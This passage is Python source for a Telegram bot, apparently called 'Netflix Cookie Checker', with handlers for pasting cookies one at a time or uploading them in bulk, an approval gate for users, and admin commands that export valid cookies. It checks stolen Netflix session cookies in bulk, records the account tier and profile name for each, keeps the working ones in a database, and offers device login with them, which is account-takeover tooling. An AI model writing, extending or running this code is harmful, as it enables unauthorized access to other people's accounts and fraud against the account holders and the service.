    text = (
        f"{Emoji.LOGIN} <b>DEVICE LOGIN</b>\n"
        f"{SEP}\n"
        f"{Emoji.ID} <b>Cookie ID:</b> <code>{cookie_id}</code>\n"
        f"{Emoji.PROFILE} <b>Profile:</b> <code>{cookie_doc.get('profile_name', 'Unknown')}</code>\n"
        f"{Emoji.PLAN} <b>Plan:</b> <code>{cookie_doc.get('account_tier', 'Unknown')}</code>\n\n"
        f"{Emoji.SPARKLE} <b>Choose a device:</b>"
    )
    await update.message.reply_text(text, parse_mode="HTML", reply_markup=keyboard)

async def handle_cookie_message(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Handle direct cookie paste"""
    user_id = update.effective_user.id
    
    if not db.is_user_approved(user_id):
        await update.message.reply_text(
            f"{Emoji.LOCK} <b>Access Restricted</b>",
            parse_mode="HTML"
        )
        return
    
    cookie = update.message.text.strip()
    if not validate_cookie(cookie):
        await update.message.reply_text(
            f"{Emoji.ERROR} <b>Invalid Cookie Format</b>\n\n"
            f"Paste a valid Netflix cookie or use <code>/check</code>\n"
            f"Send a <code>.txt</code> file for bulk check.",
            parse_mode="HTML"
        )
        return
    
    context.args = [cookie]
    await check_single(update, context)

async def handle_bulk_file(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Handle .txt file upload for bulk check"""
    user_id = update.effective_user.id
    
    if not db.is_user_approved(user_id):
        await update.message.reply_text(
            f"{Emoji.LOCK} <b>Access Restricted</b>",
            parse_mode="HTML"
        )
        return
    
    document = update.message.document
    if not document or not document.file_name.endswith('.txt'):
        await update.message.reply_text(
            f"{Emoji.ERROR} <b>Invalid File</b>\n\n"
            f"Please upload a <code>.txt</code> file with one cookie per line.",
            parse_mode="HTML"
        )
        return
    
    msg = await update.message.reply_text(
        f"{Emoji.DOWNLOAD} <b>Processing File</b>\n"
        f"{Emoji.CLOCK} Downloading and parsing...",
        parse_mode="HTML"
    )
    
    try:
        file = await context.bot.get_file(document.file_id)
        content = await file.download_as_bytearray()
        cookies = content.decode('utf-8', errors='ignore').splitlines()
        cookies = [c.strip() for c in cookies if c.strip()]
        
        if not cookies:
            await msg.edit_text(
                f"{Emoji.ERROR} <b>Empty File</b>\n\n"
                f"No cookies found in the uploaded file.",
                parse_mode="HTML"
            )
            return
        
        if len(cookies) > MAX_BULK_CHECK:
            await msg.edit_text(
                f"{Emoji.WARNING} <b>Too Many Cookies</b>\n\n"
                f"Maximum: <code>{MAX_BULK_CHECK}</code>\n"
                f"Found: <code>{len(cookies)}</code>\n"
                f"Please split into multiple files.",
                parse_mode="HTML"
            )
            return
        
        # Add to database
        added = db.add_cookies_bulk(cookies, user_id)
        valid_cookies = [c for c in added if c.get("status") == "added"]
        
        if not valid_cookies:
            await msg.edit_text(
                f"{Emoji.ERROR} <b>No Valid Cookies</b>\n\n"
                f"All {len(cookies)} entries were invalid or skipped.",
                parse_mode="HTML"
            )
            return
        
        await msg.edit_text(
            f"{Emoji.UPLOAD} <b>Processing {len(valid_cookies)} Cookies</b>\n"
            f"{Emoji.CLOCK} Validating...",
            parse_mode="HTML"
        )
        
        # Progress tracking
        progress_msg = await update.message.reply_text(
            f"{Emoji.CLOCK} <b>Progress:</b> 0 / {len(valid_cookies)}",
            parse_mode="HTML"
        )
        
        async def progress_callback(current, total):
            if current % 3 == 0 or current == total:
                try:
                    await progress_msg.edit_text(
                        f"{Emoji.CLOCK} <b>Progress:</b> {current} / {total}\n"
                        f"{Emoji.SPARKLE} <i>Working... please wait</i>",
                        parse_mode="HTML"
                    )
                except:
                    pass
        
        # Check all
        results = await NetflixChecker.check_bulk_cookies(
            [c["cookie"] for c in valid_cookies],
            progress_callback=progress_callback
        )
        
        # Update database
        valid_count = 0
        for result in results:
            cookie = result.get("cookie", "")
            if not cookie:
                continue
            cookie_hash = hashlib.sha256(cookie.encode()).hexdigest()
            cookie_doc = db.get_cookie_by_hash(cookie_hash)
            if cookie_doc:
                if result.get("valid"):
                    db.update_cookie_status(cookie_doc["_id"], "valid", {
                        "account_tier": result.get("account_tier"),
                        "profile_name": result.get("profile_name"),
                        "profile_language": result.get("profile_language"),
                        "maturity_level": result.get("maturity_level"),
                        "expires_at": result.get("expires_at")
                    })
                    valid_count += 1
                else:
                    status = "expired" if "expired" in str(result.get("error", "")).lower() else "invalid"
                    db.update_cookie_status(cookie_doc["_id"], status, {"error": result.get("error")})
                db.log_check(user_id, cookie_doc["_id"], result.get("valid") and "valid" or "invalid", result)
        
        db.increment_user_stats(user_id, len(results), valid_count)
        db.update_user_activity(user_id)
        
        # Final response
        text = (
            f"{Emoji.SUCCESS} <b>BULK CHECK COMPLETE</b>\n"
            f"{SEP}\n"
            f"{Emoji.DOWNLOAD} <b>Processed:</b> <code>{len(results)}</code>\n"
            f"{Emoji.SUCCESS} <b>Valid:</b> <code>{valid_count}</code>\n"
            f"{Emoji.ERROR} <b>Invalid:</b> <code>{len(results) - valid_count}</code>\n\n"
            f"{Emoji.SPARKLE} <b>Thank you for using the bot!</b>"
        )
        await progress_msg.edit_text(text, parse_mode="HTML")
        
    except Exception as e:
        logger.error(f"Bulk error: {e}")
        await msg.edit_text(
            f"{Emoji.ERROR} <b>Processing Failed</b>\n\n"
            f"Error: <code>{str(e)}</code>",
            parse_mode="HTML"
        )

# ============================ ADMIN COMMANDS ===========================
@admin_required
async def admin_approve(update: Update, context: ContextTypes.DEFAULT_TYPE):
    try:
        if len(context.args) < 1:
            await update.message.reply_text(
                f"{Emoji.ERROR} Usage: <code>/approve &lt;user_id&gt;</code>",
                parse_mode="HTML"
            )
            return
        user_id = int(context.args[0])
        db.create_user(user_id)
        if db.approve_user(user_id):
            await update.message.reply_text(
                f"{Emoji.SUCCESS} <b>User {user_id} approved.</b>",
                parse_mode="HTML"
            )
            try:
                await context.bot.send_message(
                    user_id,
                    f"{Emoji.SUCCESS} <b>Account Approved!</b>\n\n"
                    f"Your access has been granted.\n"
                    f"Use <code>/start</code> to begin.",
                    parse_mode="HTML"
                )
            except:
                pass
    except ValueError:
        await update.message.reply_text(
            f"{Emoji.ERROR} <b>Invalid user ID.</b>",
            parse_mode="HTML"
        )

@admin_required
async def admin_disapprove(update: Update, context: ContextTypes.DEFAULT_TYPE):
    try:
        if len(context.args) < 1:
            await update.message.reply_text(
                f"{Emoji.ERROR} Usage: <code>/disapprove &lt;user_id&gt;</code>",
                parse_mode="HTML"
            )
            return
        user_id = int(context.args[0])
        if db.disapprove_user(user_id):
            await update.message.reply_text(
                f"{Emoji.SUCCESS} <b>User {user_id} disapproved.</b>",
                parse_mode="HTML"
            )
    except ValueError:
        await update.message.reply_text(
            f"{Emoji.ERROR} <b>Invalid user ID.</b>",
            parse_mode="HTML"
        )

@admin_required
async def admin_users(update: Update, context: ContextTypes.DEFAULT_TYPE):
    users = list(db.users.find({"user_id": {"$ne": None}}))
    if not users:
        await update.message.reply_text(
            f"{Emoji.INFO} <b>No users found.</b>",
            parse_mode="HTML"
        )
        return
    
    approved = sum(1 for u in users if u.get("approved", False))
    admins = sum(1 for u in users if u.get("is_admin", False))
    
    text = (
        f"{Emoji.USERS} <b>USER LIST</b>\n"
        f"{SEP}\n"
        f"{Emoji.USERS} <b>Total:</b> <code>{len(users)}</code>\n"
        f"{Emoji.SUCCESS} <b>Approved:</b> <code>{approved}</code>\n"
        f"{Emoji.ADMIN} <b>Admins:</b> <code>{admins}</code>\n\n"
    )
    
    for user in users[:15]:
        status = Emoji.SUCCESS if user.get("approved") else Emoji.ERROR
        if user.get("is_admin"):
            status = Emoji.CROWN
        text += f"{status} <code>{user['user_id']}</code> ─ Checks: <code>{user.get('total_checks', 0)}</code>\n"
    
    if len(users) > 15:
        text += f"\n{Emoji.INFO} <i>... and {len(users) - 15} more.</i>"
    
    await update.message.reply_text(text, parse_mode="HTML")

@admin_required
async def admin_export(update: Update, context: ContextTypes.DEFAULT_TYPE):
    cookies = db.get_valid_cookies()
    if not cookies:
        await update.message.reply_text(
            f"{Emoji.INFO} <b>No valid cookies to export.</b>",
            parse_mode="HTML"
        )
        return
    
    os.makedirs(EXPORT_DIR, exist_ok=True)
    filename = f"netflix_valid_{int(time.time())}.txt"
    filepath = os.path.join(EXPORT_DIR, filename)
    
    with open(filepath, 'w', encoding='utf-8') as f:
        f.write("# Netflix Valid Cookies\n")
        f.write(f"# Exported: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n")
        f.write(f"# Total: {len(cookies)}\n\n")
        for cookie in cookies:
            f.write(f"{cookie['cookie']}\n")
    
    with open(filepath, 'rb') as f:
        await update.message.reply_document(
            document=f,
            filename=filename,
            caption=f"{Emoji.EXPORT} <b>{len(cookies)} valid cookies exported.</b>",
            parse_mode="HTML"
        )
    os.remove(filepath)

@admin_required
async def admin_cleanup(update: Update, context: ContextTypes.DEFAULT_TYPE):
    msg = await update.message.reply_text(
        f"{Emoji.CLEAN} <b>Cleaning up invalid cookies...</b>",
        parse_mode="HTML"
    )
    deleted = db.delete_invalid_cookies()
    await msg.edit_text(
        f"{Emoji.SUCCESS} <b>Deleted {deleted} invalid/expired cookies.</b>",
        parse_mode="HTML"
    )

@admin_required
async def admin_clear(update: Update, context: ContextTypes.DEFAULT_TYPE):
    keyboard = InlineKeyboardMarkup([
        [
            InlineKeyboardButton(f"{Emoji.WARNING} Yes, clear all", callback_data="clear_confirm"),
            InlineKeyboardButton(f"{Emoji.ERROR} Cancel", callback_data="clear_cancel")
        ]
    ])
    await update.message.reply_text(
        f"{Emoji.WARNING} <b>DANGER: Clear All Cookies</b>\n\n"
        f"This will delete <b>ALL</b> cookies from the database.\n"
        f"This action <b>CANNOT</b> be undone.\n\n"
        f"Are you sure?",
        reply_markup=keyboard,
        parse_mode="HTML"
    )

# ============================ CALLBACKS ================================
async def callback_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    data = query.data
    
    if data == "restart":
        await query.edit_message_text(
            f"{Emoji.SPARKLE} <b>Restarted.</b>\n"
            f"Use <code>/check</code> to validate a cookie.",
            parse_mode="HTML"
        )
        return
    
    if data.startswith("upload_"):
        await query.edit_message_text(
            f"{Emoji.UPLOAD} <b>File Upload Mode</b>\n\n"
            f"Send a <code>.txt</code> file with one cookie per line.",
            parse_mode="HTML"
        )
        return

async def clear_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    
    if query.data == "clear_confirm":
        user_id = query.from_user.id
        if user_id not in ADMIN_IDS:
            await query.edit_message_text(
                f"{Emoji.ERROR} <b>Unauthorized.</b>",
                parse_mode="HTML"
            )
            return
        total = db.delete_all_cookies()
        await query.edit_message_text(
            f"{Emoji.DELETE} <b>Cleared {total} cookies.</b>",
            parse_mode="HTML"
        )
    else:
        await query.edit_message_text(
            f"{Emoji.ERROR} <b>Operation cancelled.</b>",
            parse_mode="HTML"
        )

# ============================ ERROR HANDLER ============================
async def error_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
    logger.error(f"Update {update} caused error: {context.error}")
    try:
        await update.message.reply_text(
            f"{Emoji.WARNING} <b>Something went wrong</b>\n\n"
            f"Please try again. If the issue persists, contact support.",
            parse_mode="HTML"
        )
    except:
        pass

# ============================ MAIN ====================================
def main():
    if not BOT_TOKEN:
        logger.error("❌ BOT_TOKEN not set!")
        sys.exit(1)
    
    if not MONGODB_URI:
        logger.error("❌ MONGODB_URI not set!")
        sys.exit(1)
    
    application = Application.builder().token(BOT_TOKEN).build()
    
    # User commands
    application.add_handler(CommandHandler("start", start))
    application.add_handler(CommandHandler("help", help_command))
    application.add_handler(CommandHandler("check", check_single))
    application.add_handler(CommandHandler("login", login_command))
    application.add_handler(CommandHandler("valid", valid_cookies))
    application.add_handler(CommandHandler("stats", stats_command))
    
    # Admin commands
    application.add_handler(CommandHandler("approve", admin_approve))
    application.add_handler(CommandHandler("disapprove", admin_disapprove))
    application.add_handler(CommandHandler("users", admin_users))
    application.add_handler(CommandHandler("export", admin_export))
    application.add_handler(CommandHandler("cleanup", admin_cleanup))
    application.add_handler(CommandHandler("clear", admin_clear))
    
    # Message handlers
    application.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, handle_cookie_message))
    application.add_handler(MessageHandler(filters.Document.ALL, handle_bulk_file))
    
    # Callback handlers
    application.add_handler(CallbackQueryHandler(callback_handler, pattern="^(upload_|restart)"))
    application.add_handler(CallbackQueryHandler(clear_callback, pattern="^clear_"))
    
    application.add_error_handler(error_handler)
    
    logger.info("🚀 Netflix Cookie Checker Bot started!")
    print(f"""
╔══════════════════════════════════════════════════════════════════╗
║  🎬 NETFLIX COOKIE CHECKER BOT - ULTIMATE EDITION             ║
║  ══════════════════════════════════════════════════════════════ ║
║  ✦ Version: {VERSION}                                         ║
║  ✦ Status: ✅ Running                                         ║
║  ✦ Database: ✅ Connected                                     ║
║  ✦ Admin: {len(ADMIN_IDS)} users                             ║
╚══════════════════════════════════════════════════════════════════╝
    """)
    application.run_polling(allowed_updates=Update.ALL_TYPES)

if __name__ == "__main__":
    main()